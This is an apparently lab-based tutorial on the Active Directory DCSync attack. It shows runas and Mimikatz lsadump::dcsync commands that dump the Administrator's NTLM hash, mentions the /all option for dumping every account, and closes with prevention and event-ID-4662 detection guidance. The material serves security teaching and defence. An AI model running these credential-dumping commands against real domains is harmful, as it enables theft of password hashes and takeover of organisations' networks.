## Description

DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**

## Attack

We will utilize the user Rocky (whose password is Slavi123) to showcase the DCSync attack. When we check the permissions for Rocky, we see that he has Replicating Directory Changes and Replicating Directory Changes All assigned:

### Step 1: Start Command Shell as Rocky

```
C:\Users\bob\Downloads>runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
```

### Step 2: Use Mimikatz to Perform DCSync

To execute DCSync, we use Mimikatz. This example targets the user 'Administrator':

```bash
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
  ```

Alternatively, we can use the `/all` parameter to dump the hashes of the entire AD environment.

## Prevention

Since DCSync replicates common operations in Active Directory, complete prevention is not achievable directly. However, **using third-party solutions like RPC Firewall** can restrict replication permissions to trusted Domain Controllers only, allowing replication only for essential accounts.

## Detection

Detecting DCSync is possible by monitoring for **event ID 4662**, as each replication attempt logs this event. To reduce false positives, ensure:

1. The event properties `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` are present.
2. Whitelist systems/accounts that need replication, such as Azure AD Connect.

### Example Event

When Mimikatz is used for DCSync, the following event may be generated:

- **Event ID**: 4662
- **Details**: Shows a user account initiating replication, which can serve as an alert to unauthorized DCSync attempts.